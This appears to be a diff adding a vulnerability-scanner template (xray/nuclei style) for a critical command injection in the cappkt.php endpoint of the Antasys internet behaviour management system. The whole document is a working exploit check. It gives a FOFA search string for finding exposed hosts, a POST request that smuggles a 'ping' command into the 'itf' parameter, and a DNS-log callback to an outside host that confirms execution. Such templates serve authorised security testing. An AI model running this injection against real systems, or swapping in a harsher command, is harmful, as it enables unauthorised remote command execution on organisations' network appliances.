@@ -1,0 +1,20 @@
+id: poc-yaml-antasys-ibms-cappkt-command-injection
+info:
+  name: 汉塔科技 上网行为管理系统 cappkt 命令注入漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 命令注入
+  finger: 上网行为管理系统
+  fofa: body="Antasys"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /dgn/dgn_tools/cappkt.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: itf=127.0.0.1;ping%20{{.domain}};%20%23%20&pktcnt=1&txtip=10
+  expression: reverse.Verify()
+transport: http
